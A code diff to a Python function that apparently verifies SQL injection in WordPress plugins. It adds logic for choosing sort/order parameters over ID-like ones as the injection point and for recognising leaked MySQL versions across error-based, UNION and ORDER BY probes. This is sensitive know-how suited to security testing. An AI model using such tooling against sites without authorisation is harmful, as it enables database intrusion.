@@ -4578,6 +4578,27 @@ def verify_wordpress_sqli(
     params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
     _sqli_param_from_hints = bool(sqli_param_hint or _pick_param(parameters, _SQLI_HINTS))
     sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
+    # Guard: if the chosen param's base value looks like a structural identifier (short hex hash
+    # or pure integer), it's probably a lookup key (e.g. directory_id=f3e71 in Ultimate Member),
+    # not the injection point. Prefer a sort*/order* param if one exists.
+    if sqli_param and isinstance(parameters, dict):
+        import re as _spg_re
+        _spg_val = str(parameters.get(sqli_param, ""))
+        _spg_name_lc = sqli_param.lower()
+        _spg_struct_name = bool(_spg_re.search(
+            r'(?:_id|_hash|directory|resource|hash|token)', _spg_name_lc))
+        _is_structural = bool(
+            (_spg_re.match(r'^[a-f0-9]{4,16}$', _spg_val) and _spg_struct_name) or  # hex hash
+            (_spg_re.match(r'^\d{1,10}$', _spg_val) and _spg_struct_name)            # integer id
+        )
+        if _is_structural:
+            _sort_alt = _pick_param(parameters, ("sort", "order", "orderby", "sorting", "filter"))
+            if _sort_alt and _sort_alt != sqli_param:
+                step(f"sqli_param corregido '{sqli_param}' → '{_sort_alt}' "
+                     f"('{sqli_param}'={_spg_val!r} parece identificador/hash estructural, "
+                     f"no param de inyeccion; priorizando '{_sort_alt}')")
+                sqli_param = _sort_alt
+                _sqli_param_from_hints = True
     if not sqli_param:
         res.detail = "no se identifico el parametro a inyectar"
         res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
@@ -5326,6 +5347,13 @@ def verify_wordpress_sqli(
                 "url": _ctrl_url,
             })
         version_noise = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", base_resp.text or ""))
+        def _is_plausible_mysql_ver(v: str) -> bool:
+            """MySQL >= 4.0.0, so major ≥ 4. 0.x.y / 1.x.y / 2.x.y / 3.x.y are plugin/JS versions."""
+            try:
+                major = int(v.split(".")[0])
+                return major >= 4
+            except (ValueError, IndexError):
+                return False
         # contextos de inyeccion: el query real puede envolver el valor en comillas simples,
         # dobles, un parentesis, o nada (contexto numerico) -- probar los cuatro en vez de asumir
         # uno solo evita fallar por adivinar mal el contexto, no por no haber inyeccion de verdad.
@@ -5353,7 +5381,7 @@ def verify_wordpress_sqli(
                     except Exception as e:
                         error_tried.append({"payload": payload_val, "error": str(e)})
                         continue
-                    new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
+                    new_versions = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "") if _is_plausible_mysql_ver(v)} - version_noise
                     error_tried.append({"payload": payload_val, "status": r.status_code,
                                         "version_nueva": sorted(new_versions),
                                         "respuesta_cuerpo_recorte": (r.text or "")[:300]})
@@ -5372,7 +5400,7 @@ def verify_wordpress_sqli(
                 except Exception as e:
                     error_tried.append({"payload": payload_val, "error": str(e)})
                     continue
-                new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
+                new_versions = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "") if _is_plausible_mysql_ver(v)} - version_noise
                 error_tried.append({"payload": payload_val, "status": r.status_code,
                                     "version_nueva": sorted(new_versions),
                                     "respuesta_cuerpo_recorte": (r.text or "")[:300]})
@@ -5445,7 +5473,7 @@ def verify_wordpress_sqli(
                         except Exception as e:
                             union_tried.append({"payload": payload_val, "error": str(e)})
                             continue
-                        new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
+                        new_versions = {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "") if _is_plausible_mysql_ver(v)} - version_noise
                         union_tried.append({"payload": payload_val, "status": r.status_code,
                                             "version_nueva": sorted(new_versions)})
                         if new_versions:
@@ -5845,8 +5873,9 @@ def verify_wordpress_sqli(
                 except Exception as e:
                     orderby_error_tried.append({"payload": payload_val, "error": str(e)})
                     continue
-                new_versions = (set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or ""))
-                               - version_noise)
+                new_versions = (
+                    {v for v in re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")
+                     if _is_plausible_mysql_ver(v)} - version_noise)
                 _body_snip = (r.text or "").replace("\n", " ")
                 # Capture a larger slice (1000 chars) to ensure MySQL XPATH error is not
                 # cut off by a long PHP deprecation warning that can exceed 300 chars.
